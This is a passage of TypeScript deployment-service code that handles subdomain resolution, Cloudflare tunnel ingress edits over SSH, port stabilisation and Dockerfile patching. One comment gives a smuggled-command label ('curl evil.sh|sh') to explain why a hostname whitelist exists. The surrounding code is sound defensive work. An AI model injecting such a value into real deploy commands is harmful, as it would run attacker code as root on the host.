  private subdomain(base: string, service: string): string {
    const svc =
      service.toLowerCase().replace(/[^a-z0-9-]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '') ||
      'svc';
    // The repo-root / sole service uses the BARE slug → <slug>.toolswave.net (matches
    // the platform convention). Extra services in a multi-service workspace still get a
    // <slug>-<svc> suffix so each gets its own subdomain.
    if (svc === 'root' || svc === base) return base.slice(0, 60).replace(/-$/, '');
    return `${base}-${svc}`.slice(0, 60).replace(/-$/, '');
  }

  /** Parse `docker compose config --format json` → per-service toolswave.* labels. */
  private parseComposeLabels(json: string): Map<string, { host?: string; subdomain?: string }> {
    const out = new Map<string, { host?: string; subdomain?: string }>();
    try {
      const cfg = JSON.parse(json) as { services?: Record<string, { labels?: unknown }> };
      for (const [name, def] of Object.entries(cfg.services ?? {})) {
        const labels = def?.labels;
        const get = (k: string): string | undefined => {
          if (Array.isArray(labels)) {
            const m = (labels as string[]).find((l) => String(l).startsWith(`${k}=`));
            return m ? String(m).slice(k.length + 1) : undefined;
          }
          if (labels && typeof labels === 'object') {
            const v = (labels as Record<string, unknown>)[k];
            return v == null ? undefined : String(v);
          }
          return undefined;
        };
        out.set(name, { host: get('toolswave.host'), subdomain: get('toolswave.subdomain') });
      }
    } catch {
      /* no/invalid labels → everyone uses auto names */
    }
    return out;
  }

  /** Public hosts already owned by OTHER apps' server-deploys (don't hijack them). */
  private async takenHosts(exceptAppId: string): Promise<Set<string>> {
    const rows = await this.prisma.serverDeploy.findMany({
      where: { appId: { not: exceptAppId } },
      select: { services: true },
    });
    const set = new Set<string>();
    for (const r of rows) {
      for (const e of (r.services as unknown as ServerDeployServiceEntry[]) ?? []) {
        if (e?.subdomain) set.add(e.subdomain);
      }
    }
    return set;
  }

  /**
   * The public host for a service: a label-declared custom domain when valid (under
   * the deploy domain AND not already owned by another app), otherwise the auto
   * `<slug>-<svc>.<domain>`. Lets a user point services at the domains their app +
   * Google OAuth are configured for. `rejected` is set when a custom domain was
   * requested but refused (taken) so the caller can surface it.
   */
  private resolveHost(
    label: { host?: string; subdomain?: string } | undefined,
    base: string,
    service: string,
    taken: Set<string>,
  ): { host: string; custom: boolean; rejected?: string } {
    const domain = this.env.SERVER_DEPLOY_DOMAIN;
    const auto = `${this.subdomain(base, service)}.${domain}`;
    let want: string | null = null;
    if (label?.host) {
      const h = label.host.toLowerCase().trim().replace(/^https?:\/\//, '').replace(/\/.*$/, '');
      // Tên miền phải đúng NGỮ PHÁP hostname, không chỉ đúng vùng.
      //
      // Chuỗi này đến từ nhãn compose trong repo của người dùng và chảy thẳng vào lệnh shell trên
      // máy chủ deploy. Kiểm mỗi `endsWith('.<domain>')` là chưa đủ: một nhãn kiểu
      // `x;curl evil.sh|sh;.toolswave.net` vẫn qua được và chạy lệnh với quyền root.
      // Danh sách trắng ký tự là hàng rào đúng chỗ — chặn tại nơi dữ liệu đi vào, không phải
      // tại nơi nó được dùng.
      const HOSTNAME_RE = /^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)*$/;
      if (HOSTNAME_RE.test(h) && h.length <= 253 && (h === domain || h.endsWith(`.${domain}`))) {
        want = h; // only our zone (cert/tunnel cover it)
      }
    } else if (label?.subdomain) {
      const sub = label.subdomain
        .toLowerCase()
        .replace(/[^a-z0-9-]/g, '-')
        .replace(/-+/g, '-')
        .replace(/^-|-$/g, '');
      if (sub) want = `${sub}.${domain}`;
    }
    if (!want) return { host: auto, custom: false };
    if (taken.has(want)) return { host: auto, custom: false, rejected: want };
    return { host: want, custom: true };
  }

  /** A backing service that must stay internal (never gets a public subdomain). */
  private isInternalService(name: string): boolean {
    return /(^|[-_])(mongo|mongodb|postgres|postgresql|pg|redis|mysql|mariadb|memcached|rabbitmq|kafka|elasticsearch|db)([-_]|$)/i.test(
      name,
    );
  }

  /**
   * Ensure the Cloudflare tunnel routes each host → nginx (localhost:80) by adding
   * any MISSING ingress rules before the catch-all 404. Safe: backs up the config,
   * validates the new config, and RESTORES the backup if validation fails (so a bad
   * edit can never take the whole tunnel — incl. app.toolswave.net — offline).
   * Runs server-side as root via the deploy SSH key.
   */
  private async ensureIngress(hosts: string[]): Promise<string> {
    const cfg = '/etc/cloudflared/config.yml';
    const cur = await this.ssh(`cat ${cfg}`);
    if (cur.code !== 0) throw new Error('không đọc được config tunnel');
    const s = cur.out;
    const CATCHALL = '- service: http_status:404';
    if (!s.includes(CATCHALL)) throw new Error('không nhận ra định dạng ingress (thiếu catch-all)');
    const missing = hosts.filter((h) => h && !s.includes(`hostname: ${h}`));
    if (missing.length === 0) return 'ingress: đã có sẵn';
    const block =
      missing.map((h) => `  - hostname: ${h}\n    service: http://localhost:80`).join('\n') + '\n  ';
    // Insert before the catch-all (first occurrence).
    const ns = s.replace(`  ${CATCHALL}`, `${block}${CATCHALL}`);
    if (ns === s) throw new Error('không chèn được ingress (catch-all không khớp thụt lề)');
    await this.ssh(`cp -a ${cfg} ${cfg}.tw.bak`);
    await this.sshWrite(cfg, ns);
    const val = await this.ssh(
      `PATH="$PATH:/usr/local/bin" cloudflared --config ${cfg} tunnel ingress validate 2>&1`,
    );
    if (val.code !== 0) {
      await this.ssh(`cp -a ${cfg}.tw.bak ${cfg}`); // restore — never leave a broken tunnel
      throw new Error(`config không hợp lệ, đã khôi phục: ${val.out.trim().split('\n').pop()}`);
    }
    // cloudflared.service has NO ExecReload → `systemctl reload` errors with "reload
    // is not applicable"; use restart (config already validated, so this applies the
    // new ingress; brief ~1-2s tunnel blip). Restore only if the RESTART itself fails.
    const reload = await this.ssh(`systemctl restart cloudflared 2>&1`);
    if (reload.code !== 0) {
      await this.ssh(`cp -a ${cfg}.tw.bak ${cfg}`);
      await this.ssh(`systemctl restart cloudflared 2>&1`);
      throw new Error(`restart lỗi, đã khôi phục: ${reload.out.trim().slice(-200)}`);
    }
    return `ingress: thêm ${missing.length} host + restart tunnel`;
  }


  /**
   * Patch common Dockerfile pitfalls AT DEPLOY TIME (never touches the stored
   * source). Most imported repos commit a package.json but NOT a lockfile, yet
   * their Dockerfile does `COPY package.json package-lock.json ./` + `npm ci` —
   * which fails at the COPY (missing file) and at `npm ci` (requires a lockfile).
   * For any service with NO lockfile we drop the lockfile from the install COPY and
   * relax the lockfile-strict install commands. Services that DO ship a lockfile are
   * left untouched (their `npm ci` is correct + reproducible).
   */
  /** Small stable string hash (djb2) — for deterministic per-app host-port assignment. */
  private hashStr(s: string): number {
    let h = 5381;
    for (let i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) >>> 0;
    return h;
  }

  /** Deterministic app-scoped host port in [20000, 60000) for the Nth mapping. */
  private stableHostPort(slug: string, idx: number, cport: string): number {
    return 20000 + (this.hashStr(`${slug}:${idx}:${cport}`) % 40000);
  }

  /**
   * Rewrite every host port inside `ports:` blocks to a STABLE app-scoped port so
   * the published port survives container recreates (random ports change → nginx
   * 502). SCOPED to ports: blocks ONLY — bare numbers elsewhere (e.g. command args
   * like ["uvicorn","--port","8000"]) are left untouched. Handles both the inline
   * `ports: ["9000:3000","8000"]` and the multi-line `- "9000:3000"` forms.
   */
  private stabilizePorts(content: string, slug: string): string {
    // One mapping value (with optional surrounding quote): "127.0.0.1:9000:3000",
    // "9000:3000", "3000", "3000/udp". Container port = the final number.
    const mapRe = /(["']?)([\d.]+:)?(?:(\d+):)?(\d+)(\/(?:tcp|udp))?\1/;
    let idx = 0;
    const rewriteValue = (val: string): string => {
      const m = val.match(mapRe);
      if (!m || m[0] !== val.trim()) return val; // not a pure port value → leave as-is
      const q = m[1] ?? '';
      const cport = m[4];
      const proto = m[5] ?? '';
      const host = this.stableHostPort(slug, idx++, cport);
      // Bind to LOOPBACK. Docker publishes a bare `host:container` mapping on 0.0.0.0, and
      // stableHostPort is deterministic from the slug — so every user's app backend (and any
      // database its compose file publishes) used to sit on a GUESSABLE port reachable from the
      // whole LAN/tailnet, skipping nginx and every limit in front of it. nginx reaches these
      // over 127.0.0.1 (see NGINX_TEMPLATE), so loopback is all they ever needed.
      // Note this deliberately DROPS any bind address the author wrote, exactly as before —
      // the difference is the default is now closed instead of open.
      return val.replace(m[0], `${q}${LOOPBACK_BIND}:${host}:${cport}${proto}${q}`);
    };

    let portsIndent = -1; // -1 = not currently inside a ports: block
    return content
      .split('\n')
      .map((line) => {
        // inline form: ports: ["9000:3000", "8000"]  (+ optional trailing # comment)
        const inline = line.match(/^(\s*)ports:\s*\[(.*)\]\s*(#.*)?$/);
        if (inline) {
          const body = inline[2]
            .split(',')
            .map((part) => {
              const lead = part.match(/^\s*/)?.[0] ?? '';
              const trail = part.match(/\s*$/)?.[0] ?? '';
              return `${lead}${rewriteValue(part.trim())}${trail}`;
            })
            .join(',');
          return `${inline[1]}ports: [${body}]${inline[3] ? ' ' + inline[3] : ''}`;
        }
        const key = line.match(/^(\s*)ports:\s*$/);
        if (key) {
          portsIndent = key[1].length;
          return line;
        }
        if (portsIndent >= 0) {
          const trimmed = line.trim();
          // Blank / comment-only lines never close the block.
          if (!trimmed || trimmed.startsWith('#')) return line;
          const indent = line.match(/^(\s*)/)?.[0].length ?? 0;
          // Long syntax: "- target: 3000 / published: 9000 / protocol: tcp".
          const pub = line.match(/^(\s*published:\s*)(\d+)(\s*(?:#.*)?)$/);
          if (pub && indent > portsIndent) {
            return `${pub[1]}${this.stableHostPort(slug, idx++, pub[2])}${pub[3]}`;
          }
          // Short syntax list item: "- 9000:3000" (+ optional trailing # comment).
          // indent >= portsIndent so same-indent sequences (- at the ports: column)
          // are covered, not just nested ones.
          const item = line.match(/^(\s*-\s*)(.*?)(\s*(?:#.*)?)$/);
          if (item && item[2] && indent >= portsIndent) {
            return `${item[1]}${rewriteValue(item[2])}${item[3]}`;
          }
          // A non-list line at the same/shallower indent closes the ports: block.
          if (indent <= portsIndent) portsIndent = -1;
        }
        return line;
      })
      .join('\n');
  }

  private sanitizeInfra(files: GeneratedFile[], slug: string): GeneratedFile[] {
    const norm = (p: string) => p.replace(/^\.?\/+/, '');
    const dirOf = (p: string) => (p.includes('/') ? p.slice(0, p.lastIndexOf('/')) : '');
    const lockDirs = new Set<string>();
    for (const f of files) {
      const p = norm(f.path);
      const base = p.split('/').pop() ?? '';
      if (base === 'package-lock.json' || base === 'yarn.lock' || base === 'pnpm-lock.yaml') {
        lockDirs.add(dirOf(p));
      }
    }
    return files.map((f) => {
      const p = norm(f.path);
      const base = p.split('/').pop() ?? '';

      // docker-compose: neutralise SHARED-HOST hazards — drop fixed host ports (let
      // Docker pick a free one; we read the actual published port from `compose ps`)
      // and drop fixed container_name (the `-p <slug>` project already namespaces
      // them). Both prevent collisions with other tenants' containers on the host.
      if (/^(docker-)?compose\.ya?ml$/.test(p)) {
        // Assign a STABLE host port per published port (deterministic from slug +
        // order + container port). Fixed host ports collide on the shared host;
        // RANDOM host ports change on every container recreate → the nginx vhost
        // (written once at deploy from `compose ps`) goes stale → 502. A stable,
        // app-scoped high port avoids both: survives recreate AND rarely collides.
        const patched = this.stabilizePorts(f.content, slug)
          // Drop fixed container_name lines (avoid global name conflicts on the host).
          .replace(/^[ \t]*container_name:[^\n]*\n?/gim, '');
        return patched === f.content ? f : { path: f.path, content: patched };
      }

      if (base !== 'Dockerfile') return f;
      if (lockDirs.has(dirOf(p))) return f; // has a lockfile → npm ci is correct
      const patched = f.content
        // Any COPY line that references a (missing) lockfile → just copy package.json.
        // The later `COPY . .` brings everything else, so dropping extras is safe.
        .replace(/^(\s*COPY\s+)[^\n]*package-lock\.json[^\n]*$/gim, '$1package.json ./')
        // npm ci REQUIRES a lockfile; npm install works without one.
        .replace(/\bnpm ci\b/g, 'npm install')
        // yarn/pnpm strict-lockfile installs also need a lockfile.
        .replace(/(yarn(?:\s+install)?)\s+--frozen-lockfile/g, '$1')
        .replace(/(pnpm\s+(?:install|i))\s+--frozen-lockfile/g, '$1');
      return patched === f.content ? f : { path: f.path, content: patched };
    });
  }

  /** Materialise the app's files to a scratch dir for rsync. */
  private async materialize(appId: string, files: GeneratedFile[]): Promise<string> {
    const root = path.resolve(this.env.WORKSPACE_DIR, `srv-${appId}`);
    await fs.rm(root, { recursive: true, force: true });
    await fs.mkdir(root, { recursive: true });
    for (const f of files) {
      const rel = f.path.replace(/^\/+/, '');
      const target = path.resolve(root, rel);
      if (target !== root && !target.startsWith(root + path.sep)) continue; // path-traversal guard
      await fs.mkdir(path.dirname(target), { recursive: true });
      await fs.writeFile(
        target,
        f.encoding === 'base64' ? Buffer.from(f.content, 'base64') : f.content,
      );
    }
    return root;
  }

  /** Parse `docker compose ps --format json` (array OR ndjson) → service+port. */
  private parsePs(out: string): { service: string; port: number | null }[] {
    const rows: Record<string, unknown>[] = [];
    const trimmed = out.trim();
    if (!trimmed) return [];
    try {
      const parsed = JSON.parse(trimmed);
      if (Array.isArray(parsed)) {
        rows.push(...(parsed as Record<string, unknown>[]));
      } else if (parsed && typeof parsed === 'object') {
        // A SINGLE service: `compose ps --format json` emits one bare object (not an
        // array). Without this it parsed fine but Array.isArray was false → dropped,
        // and the NDJSON fallback (catch) never ran → "0 service" for one-service apps.
        rows.push(parsed as Record<string, unknown>);
      }
    } catch {
      for (const line of trimmed.split('\n')) {
        const l = line.trim();
        if (!l.startsWith('{')) continue;
        try {
          rows.push(JSON.parse(l) as Record<string, unknown>);
        } catch {
          /* skip */
        }
      }
    }
    return rows.map((r) => {
      const service = String(r.Service ?? r.Name ?? '');
      const pubs = (r.Publishers as { PublishedPort?: number }[] | undefined) ?? [];
      let port = pubs.map((p) => Number(p.PublishedPort)).find((n) => n > 0) ?? null;
      // Fallback: some compose versions populate the `Ports` STRING before/instead of
      // the `Publishers` array (e.g. "0.0.0.0:54951->3000/tcp, [::]:54951->3000/tcp").
      // Parse the host port from it so we don't miss a service that IS published.
      if (!port && typeof r.Ports === 'string') {
        const m = r.Ports.match(/:(\d+)->\d+/);
        if (m) port = Number(m[1]);
      }
      return { service, port };
    });
  }

  private toInfo(row: {
    status: string;
    services: unknown;
    error: string | null;
    log?: string | null;
    updatedAt: Date;
  }): ServerDeployInfo {
    return {
      status: (row.status as ServerDeployInfo['status']) ?? 'failed',
      services: (row.services as ServerDeployServiceEntry[]) ?? [],
      error: row.error,
      log: row.log ?? null,
      updatedAt: row.updatedAt.toISOString(),
    };
  }

  // ── ssh / rsync ──────────────────────────────────────────────────────────
  // Prefer SSH KEY auth (no secret stored anywhere). Fall back to password auth
  // via sshpass (pass through SSHPASS env, never argv) when no key is configured.

  private get sshKey(): string {
    return this.env.SERVER_DEPLOY_SSH_KEY;
  }

  private childEnv(): NodeJS.ProcessEnv {
    // Only expose the password to sshpass when we're actually using password auth.
    if (this.sshKey) return { ...process.env };
    return { ...process.env, SSHPASS: this.env.SERVER_DEPLOY_SSH_PASS };
  }

  /** The ssh command + leading args for the configured auth method. */
  private sshBase(): { cmd: string; pre: string[] } {
    if (this.sshKey) return { cmd: 'ssh', pre: ['-i', this.sshKey, ...KEY_OPTS] };
    return { cmd: 'sshpass', pre: ['-e', 'ssh', ...SSH_OPTS] };
  }

  /** The rsync `-e` remote-shell string for the configured auth method. */
  private rsyncRsh(): string {
    if (this.sshKey) return `ssh -i ${this.sshKey} ${KEY_OPTS.join(' ')}`;
    return `sshpass -e ssh ${SSH_OPTS.join(' ')}`;
  }

  private run(
    cmd: string,
    args: string[],
    opts: { timeout?: number; input?: string } = {},
  ): Promise<{ code: number; out: string }> {
    return new Promise((resolve) => {
      const child = spawn(cmd, args, { env: this.childEnv() });
      let out = '';
      const onData = (b: Buffer) => (out += b.toString());
      child.stdout.on('data', onData);
      child.stderr.on('data', onData);
      const timer = setTimeout(() => child.kill('SIGKILL'), opts.timeout ?? 600_000);
      child.on('close', (code) => {
        clearTimeout(timer);
        resolve({ code: code ?? 1, out });
      });
      child.on('error', (e) => {
        clearTimeout(timer);
        resolve({ code: 1, out: out + String(e) });
      });
      if (opts.input !== undefined) {
        child.stdin.write(opts.input);
        child.stdin.end();
      }
    });
  }

  private ssh(remoteCmd: string, timeout?: number): Promise<{ code: number; out: string }> {
    const { cmd, pre } = this.sshBase();
    return this.run(cmd, [...pre, this.env.SERVER_DEPLOY_HOST, remoteCmd], { timeout });
  }

  /** Write `content` to a remote file via `ssh "cat > path"`. */
  private sshWrite(remotePath: string, content: string): Promise<{ code: number; out: string }> {
    const { cmd, pre } = this.sshBase();
    return this.run(cmd, [...pre, this.env.SERVER_DEPLOY_HOST, `cat > ${remotePath}`], {
      input: content,
    });
  }

  private rsync(localDir: string, remoteDir: string): Promise<{ code: number; out: string }> {
    const rsh = this.rsyncRsh();
    return this.run(
      'rsync',
      [
        '-az',
        '--delete',
        '-e',
        rsh,
        '--exclude',
        'node_modules',
        '--exclude',
        '.next',
        '--exclude',
        '.git',
        '--exclude',
        '__pycache__',
        '--exclude',
        'venv',
        `${localDir}/`,
        `${this.env.SERVER_DEPLOY_HOST}:${remoteDir}/`,
      ],
      { timeout: 600_000 },
    );
  }
}
